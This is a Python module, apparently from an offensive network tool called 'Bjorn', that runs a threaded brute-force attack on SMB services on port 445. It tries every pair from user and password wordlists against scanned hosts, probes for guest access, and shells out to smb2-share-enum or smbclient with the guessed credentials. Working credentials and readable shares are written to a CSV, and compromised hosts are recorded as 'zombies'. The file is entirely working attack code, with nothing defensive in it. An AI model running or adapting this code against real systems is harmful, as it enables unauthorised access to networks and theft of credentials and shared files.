"""
smb_connector.py - This script performs a brute force attack on SMB services (port 445) to find accessible shares using various user credentials. It logs the results of successful connections.
"""
import os
import sys
import csv
import threading
import logging
import time
from subprocess import Popen, PIPE

# Add vendored lib to path for pysmb
_lib_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'lib')
if _lib_path not in sys.path:
    sys.path.insert(0, _lib_path)

from smb.SMBConnection import SMBConnection
from queue import Queue, Empty
from shared import SharedData
from logger import Logger
from timeout_utils import (
    subprocess_with_timeout,
    join_threads_with_timeout,
    drain_queue_safely,
    run_with_timeout
)

# Configure the logger
logger = Logger(name="smb_connector.py", level=logging.INFO)

# Define the necessary global variables
b_class = "SMBBruteforce"
b_module = "smb_connector"
b_status = "brute_force_smb"
b_port = 445
b_parent = None

# List of generic shares to ignore
IGNORED_SHARES = {'print$', 'ADMIN$', 'IPC$', 'C$', 'D$', 'E$', 'F$'}

class SMBBruteforce:
    """
    Class to handle the SMB brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.smb_connector = SMBConnector(shared_data)
        logger.info("SMBConnector initialized.")

    def bruteforce_smb(self, ip, port, mac_address='', hostname=''):
        """
        Run the SMB brute force attack on the given IP and port.
        """
        return self.smb_connector.run_bruteforce(ip, port, mac_address, hostname)

    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        start_time = time.time()
        logger.lifecycle_start("SMBBruteforce", ip, port)
        self.shared_data.bjornorch_status = "SMBBruteforce"
        # Extract hostname and MAC from the row passed by orchestrator
        hostname = row.get('Hostnames', '')
        mac_address = row.get('MAC Address', '')
        try:
            success, results = self.bruteforce_smb(ip, port, mac_address, hostname)
            status = 'success' if success else 'no_creds_found'
        except Exception as e:
            logger.error(f"SMB bruteforce error for {ip}: {e}")
            status = 'error'
        finally:
            duration = time.time() - start_time
            logger.lifecycle_end("SMBBruteforce", status, duration, ip)
        return status

class SMBConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.scan = self._load_csv_filtered(shared_data.netkbfile, "445")

        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.smbfile = shared_data.smbfile
        # If the file doesn't exist, it will be created
        if not os.path.exists(self.smbfile):
            logger.debug(f"Creating {self.smbfile}")
            with open(self.smbfile, "w") as f:
                f.write("MAC Address,IP Address,Hostname,Share,User,Password,Port\n")
        self.results = []  # List to store results temporarily
        self.queue = Queue()
        self.progress_lock = threading.Lock()
        self.progress_count = 0
        self.progress_total = 0
        self.guest_shares = set()  # Shares accessible via guest (to skip during brute force)

    def _load_csv_filtered(self, filepath, port_filter):
        """Load CSV and filter rows containing the specified port."""
        rows = []
        if os.path.exists(filepath):
            with open(filepath, 'r', newline='') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    ports = row.get("Ports", "")
                    if ports and port_filter in ports:
                        rows.append(row)
        return rows

    def load_scan_file(self):
        """
        Load the netkb file and filter it for SMB ports.
        """
        self.scan = self._load_csv_filtered(self.shared_data.netkbfile, "445")

    def _check_guest_access(self, adresse_ip, share_name):
        """
        Check if a share allows guest/anonymous access by trying garbage credentials.
        Returns True if guest access is allowed (share should be skipped for credential logging).
        """
        import uuid
        garbage_user = f"guest_test_{uuid.uuid4().hex[:8]}"
        garbage_pass = uuid.uuid4().hex
        try:
            conn = SMBConnection(garbage_user, garbage_pass, "Bjorn", "Target", use_ntlm_v2=True)
            conn.connect(adresse_ip, 445, timeout=10)
            try:
                conn.listPath(share_name, '/', timeout=10)
                conn.close()
                return True  # Guest access allowed
            except:
                conn.close()
                return False
        except:
            return False

    def _smb_connect_inner(self, adresse_ip, user, password):
        """
        Inner connection logic for SMB - wrapped by smb_connect with timeout.
        Skips shares already found via guest access.
        """
        conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
        try:
            conn.connect(adresse_ip, 445, timeout=30)
            shares = conn.listShares(timeout=30)
            accessible_shares = []
            # Get guest shares for this IP (set during run_bruteforce)
            guest_shares = getattr(self, 'guest_shares', set())
            for share in shares:
                if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                    continue
                # Skip shares already accessible via guest
                if share.name in guest_shares:
                    continue
                try:
                    conn.listPath(share.name, '/', timeout=15)
                    accessible_shares.append(share.name)
                    logger.debug(f"Access to {share.name} on {adresse_ip} with '{user}'")
                except Exception as e:
                    logger.debug(f"Cannot access share {share.name} on {adresse_ip} with user '{user}': {e}")
            conn.close()
            return accessible_shares
        except Exception as e:
            try:
                conn.close()
            except:
                pass
            return []

    def smb_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SMB service using the given credentials.
        Wrapped with overall 90 second timeout.
        """
        try:
            return run_with_timeout(
                self._smb_connect_inner, 90,
                adresse_ip, user, password
            )
        except TimeoutError:
            logger.lifecycle_timeout("SMBBruteforce", "smb_connect", 90, adresse_ip)
            return []
        except Exception as e:
            return []

    def smb2_verify_share_access(self, adresse_ip, user, password, share_name):
        """
        Verify if a share is actually accessible by trying to list its contents.
        Uses pysmb (SMBConnection) to check if we can read the share.
        Returns True if share is accessible, False otherwise.
        """
        try:
            conn = SMBConnection(user, password, "Bjorn", "Target", use_ntlm_v2=True)
            connected = conn.connect(adresse_ip, 445, timeout=10)
            if not connected:
                return False
            try:
                # Try to list files in the share root
                files = conn.listPath(share_name, '/', timeout=10)
                conn.close()
                # If we got here without exception, share is accessible
                return len(files) > 0
            except Exception as e:
                error_msg = str(e).lower()
                # Access denied means share exists but we can't access it
                if 'access' in error_msg or 'denied' in error_msg or 'permission' in error_msg:
                    conn.close()
                    return False
                conn.close()
                return False
        except Exception as e:
            logger.debug(f"Share access verification failed for {share_name}: {e}")
            return False

    def smb2_share_enum(self, adresse_ip, user, password):
        """
        Attempt to list shares using self-contained smb2-share-enum binary (SMB2/3).
        Falls back to smbclient if binary not available.
        """
        # Path to self-contained smb2-share-enum binary
        script_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        smb2_bin = os.path.join(script_dir, 'bin', 'smb2-share-enum')

        if os.path.exists(smb2_bin):
            # Use smb2-share-enum: smb://user:pass@host/
            smb_url = f'smb://{user}:{password}@{adresse_ip}/'
            command = f'{smb2_bin} "{smb_url}"'
            try:
                stdout, stderr, returncode = subprocess_with_timeout(command, timeout=60)
                output = stdout.decode('utf-8', errors='ignore')
                if "Number of shares:" in output:
                    shares = self.parse_smb2_shares(output)
                    return shares
                else:
                    return []
            except TimeoutError:
                logger.lifecycle_timeout("SMBBruteforce", "smb2-share-enum", 60, adresse_ip)
                return []
            except Exception as e:
                logger.debug(f"Error executing smb2-share-enum for {adresse_ip}: {e}")
                return []
        else:
            # Fallback to smbclient if available
            return self.smbclient_l_fallback(adresse_ip, user, password)

    def smbclient_l_fallback(self, adresse_ip, user, password):
        """
        Fallback to system smbclient if smb2-share-enum not available.
        """
        command = f'smbclient -L //{adresse_ip} -U {user}%{password}'
        try:
            stdout, stderr, returncode = subprocess_with_timeout(command, timeout=60)
            if b"Sharename" in stdout:
                shares = self.parse_smbclient_shares(stdout.decode())
                return shares
            else:
                return []
        except TimeoutError:
            logger.lifecycle_timeout("SMBBruteforce", "smbclient -L", 60, adresse_ip)
            return []
        except Exception as e:
            return []

    def parse_smb2_shares(self, output):
        """
        Parse the output of smb2-share-enum to get the list of shares.
        Output format:
        Number of shares:3
        public
        private
        IPC$
        """
        shares = []
        lines = output.strip().splitlines()
        for line in lines:
            line = line.strip()
            if line and not line.startswith("Number of shares:"):
                share_name = line.split()[0] if line.split() else line
                if share_name and share_name not in IGNORED_SHARES:
                    shares.append(share_name)
        return shares

    def parse_smbclient_shares(self, smbclient_output):
        """
        Parse the output of smbclient -L to get the list of shares.
        """
        shares = []
        lines = smbclient_output.splitlines()
        for line in lines:
            if line.strip() and not line.startswith("Sharename") and not line.startswith("---------"):
                parts = line.split()
                if parts and parts[0] not in IGNORED_SHARES:
                    shares.append(parts[0])
        return shares

    def worker(self, success_flag):
        """
        Worker thread to process items in the queue.
        Uses graceful shutdown pattern with timeout on queue.get().
        """
        while True:
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break
            try:
                item = self.queue.get(timeout=1.0)
            except Empty:
                if self.queue.empty():
                    break
                continue

            adresse_ip, user, password, mac_address, hostname, port = item
            try:
                shares = self.smb_connect(adresse_ip, user, password)
                if shares:
                    # Collect results under lock
                    new_results = []
                    for share in shares:
                        if share not in IGNORED_SHARES:
                            new_results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                            logger.success(f"SMB credentials: {adresse_ip} | {user} | {share}")

                    if new_results:
                        with self.lock:
                            self.results.extend(new_results)
                            success_flag[0] = True

                        # File I/O outside lock to reduce contention
                        self.save_results()
                        self.removeduplicates()
            finally:
                self.queue.task_done()
                with self.progress_lock:
                    self.progress_count += 1
                    # Log progress less frequently to reduce log spam
                    if self.progress_count % 100 == 0:
                        logger.info(f"SMB brute force: {self.progress_count}/{self.progress_total}")

    def _check_guest_access_server(self, adresse_ip):
        """
        Check if the SMB server allows guest/anonymous access at the authentication level.
        This should be called BEFORE brute forcing to avoid false positives.
        Returns True if guest access is allowed (brute force should be skipped).
        """
        import uuid
        # Try completely random garbage credentials
        garbage_user = f"guestcheck_{uuid.uuid4().hex[:8]}"
        garbage_pass = uuid.uuid4().hex

        try:
            conn = SMBConnection(garbage_user, garbage_pass, "Bjorn", "Target", use_ntlm_v2=True)
            connected = conn.connect(adresse_ip, 445, timeout=15)
            if connected:
                # Try to list shares - if this works with garbage creds, it's guest access
                try:
                    shares = conn.listShares(timeout=15)
                    conn.close()
                    if shares:
                        logger.info(f"Server {adresse_ip} allows guest/anonymous access")
                        return True
                except:
                    pass
                try:
                    conn.close()
                except:
                    pass
        except Exception as e:
            logger.debug(f"Guest access check failed for {adresse_ip}: {e}")
        return False

    def run_bruteforce(self, adresse_ip, port, mac_address='', hostname=''):
        # Use provided mac_address and hostname from orchestrator (more reliable)
        # Fallback to lookup if not provided
        if not mac_address or not hostname:
            self.load_scan_file()
            for row in self.scan:
                if row.get('IPs') == adresse_ip:
                    if not mac_address:
                        mac_address = row.get('MAC Address', '')
                    if not hostname:
                        hostname = row.get('Hostnames', '')
                    break

        # Check for guest access first and enumerate guest shares
        # We'll continue brute force but only log NEW shares not accessible via guest
        self.guest_shares = set()  # Track guest-accessible shares for this IP
        if self._check_guest_access_server(adresse_ip):
            logger.info(f"Enumerating guest shares on {adresse_ip}")
            try:
                conn = SMBConnection("guest", "", "Bjorn", "Target", use_ntlm_v2=True)
                guest_connected = conn.connect(adresse_ip, 445, timeout=15)
                if guest_connected:
                    shares = conn.listShares(timeout=15)
                    for share in shares:
                        if share.isSpecial or share.isTemporary or share.name in IGNORED_SHARES:
                            continue
                        try:
                            conn.listPath(share.name, '/', timeout=10)
                            self.guest_shares.add(share.name)
                            with self.lock:
                                self.results.append([mac_address, adresse_ip, hostname, share.name, "guest", "", port])
                        except:
                            pass
                    conn.close()
                    if self.guest_shares:
                        logger.info(f"Guest access on {adresse_ip}: {len(self.guest_shares)} shares")
                        self.save_results()
                        self.removeduplicates()
                        self.shared_data.record_zombie(mac_address, adresse_ip)
            except Exception as e:
                logger.debug(f"Error enumerating guest shares on {adresse_ip}: {e}")

        total_tasks = len(self.users) * len(self.passwords)
        self.progress_total = total_tasks
        self.progress_count = 0

        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))

        success_flag = [False]
        threads = []

        logger.info(f"Bruteforcing SMB on {adresse_ip}... (0/{total_tasks})")

        for _ in range(self.shared_data.worker_threads):  # Configurable via shared_config.json
            t = threading.Thread(target=self.worker, args=(success_flag,))
            t.start()
            threads.append(t)

        # Wait for queue with exit signal checking
        queue_timeout = self.shared_data.bruteforce_queue_timeout
        queue_start = time.time()
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping bruteforce.")
                drain_queue_safely(self.queue)
                break
            if time.time() - queue_start > queue_timeout:
                logger.lifecycle_timeout("SMBBruteforce", "queue processing", queue_timeout, adresse_ip)
                drain_queue_safely(self.queue)
                break
            time.sleep(0.5)

        # Wait for queue to finish with timeout
        try:
            # Give workers time to finish current items
            time.sleep(2)
        except:
            pass

        # Join threads with timeout
        hanging = join_threads_with_timeout(threads, timeout=10, logger=logger)
        if hanging:
            logger.warning(f"SMB bruteforce: {len(hanging)} threads did not terminate cleanly")

        # Also try smb2-share-enum (SMB2/3) to find authenticated shares
        # Always run this even if guest access succeeded, to find shares requiring auth
        if not self.shared_data.orchestrator_should_exit:
            logger.info(f"Trying smb2-share-enum (SMB2/3) for authenticated shares on {adresse_ip}")

            # First check for guest access with garbage credentials
            import uuid
            garbage_user = f"guestcheck_{uuid.uuid4().hex[:8]}"
            garbage_pass = uuid.uuid4().hex
            listed_shares = self.smb2_share_enum(adresse_ip, garbage_user, garbage_pass) or []

            # Verify which shares are actually accessible (not just listed)
            guest_shares = set()
            for share in listed_shares:
                if share in IGNORED_SHARES:
                    continue
                # Verify we can actually access the share contents
                if self.smb2_verify_share_access(adresse_ip, garbage_user, garbage_pass, share):
                    guest_shares.add(share)
                    logger.debug(f"Verified guest access to {share} on {adresse_ip}")
                else:
                    logger.debug(f"Share {share} on {adresse_ip} listed but not accessible via guest")

            # Log verified guest shares
            if guest_shares:
                logger.info(f"SMB2/3 guest access on {adresse_ip}: {len(guest_shares)} shares")
                with self.lock:
                    for share in guest_shares:
                        self.results.append([mac_address, adresse_ip, hostname, share, "guest", "", port])
                    success_flag[0] = True
                self.save_results()
                self.removeduplicates()
                self.shared_data.record_zombie(mac_address, adresse_ip)

            # Continue brute force to find shares that require authentication
            # Only exclude shares that are ACCESSIBLE with guest, not just listed
            smb2_attempt_count = 0
            smb2_total = len(self.users) * len(self.passwords)
            # Track shares that are verified accessible (not just listed)
            accessible_shares = set(guest_shares) | self.guest_shares
            for user in self.users:
                if self.shared_data.orchestrator_should_exit:
                    break
                for password in self.passwords:
                    if self.shared_data.orchestrator_should_exit:
                        break
                    smb2_attempt_count += 1
                    if smb2_attempt_count % 100 == 0:
                        logger.info(f"SMB2/3 brute force: {smb2_attempt_count}/{smb2_total}")
                    shares = self.smb2_share_enum(adresse_ip, user, password)
                    if shares:
                        for share in shares:
                            if share in IGNORED_SHARES or share in accessible_shares:
                                continue
                            # Verify we can actually access this share with these credentials
                            if self.smb2_verify_share_access(adresse_ip, user, password, share):
                                accessible_shares.add(share)
                                with self.lock:
                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                                    logger.success(f"SMB credentials: {adresse_ip} | {user} | {share}")
                                    success_flag[0] = True
                                self.save_results()
                                self.removeduplicates()
                                self.shared_data.record_zombie(mac_address, adresse_ip)
                    if self.shared_data.timewait_smb > 0:
                        time.sleep(self.shared_data.timewait_smb)

        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def _ensure_header(self):
        """
        Ensure the CSV file has a header row. Creates file with header if missing,
        or prepends header if file exists but has no header.
        """
        expected_header = "MAC Address,IP Address,Hostname,Share,User,Password,Port"

        if not os.path.exists(self.smbfile):
            # File doesn't exist, create with header
            with open(self.smbfile, 'w', newline='') as f:
                f.write(expected_header + '\n')
            return

        # File exists, check if it has header
        with open(self.smbfile, 'r', newline='') as f:
            first_line = f.readline().strip()

        if first_line == expected_header:
            return  # Header already present

        # Header missing - need to prepend it
        with open(self.smbfile, 'r', newline='') as f:
            existing_content = f.read()

        with open(self.smbfile, 'w', newline='') as f:
            f.write(expected_header + '\n')
            if existing_content:
                f.write(existing_content)

        logger.info(f"Added missing header to {self.smbfile}")

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        self._ensure_header()  # Always ensure header exists before appending
        with open(self.smbfile, 'a', newline='') as f:
            writer = csv.writer(f)
            for row in self.results:
                writer.writerow(row)
        self.results = []  # Reset temporary results after saving

    def removeduplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        rows = []
        header = None
        if os.path.exists(self.smbfile):
            with open(self.smbfile, 'r', newline='') as f:
                reader = csv.reader(f)
                header = next(reader, None)
                seen = set()
                for row in reader:
                    key = tuple(row)
                    if key not in seen:
                        seen.add(key)
                        rows.append(row)

        with open(self.smbfile, 'w', newline='') as f:
            writer = csv.writer(f)
            if header:
                writer.writerow(header)
            writer.writerows(rows)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        smb_bruteforce = SMBBruteforce(shared_data)
        logger.info("Starting SMB brute force attack on port 445...")

        # Load the netkb file and get the IPs to scan
        ips_to_scan = shared_data.read_data()

        # Execute the brute force on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            smb_bruteforce.execute(ip, b_port, row, b_status)

        logger.info(f"Total number of successful attempts: {len(smb_bruteforce.smb_connector.results)}")
        exit(len(smb_bruteforce.smb_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
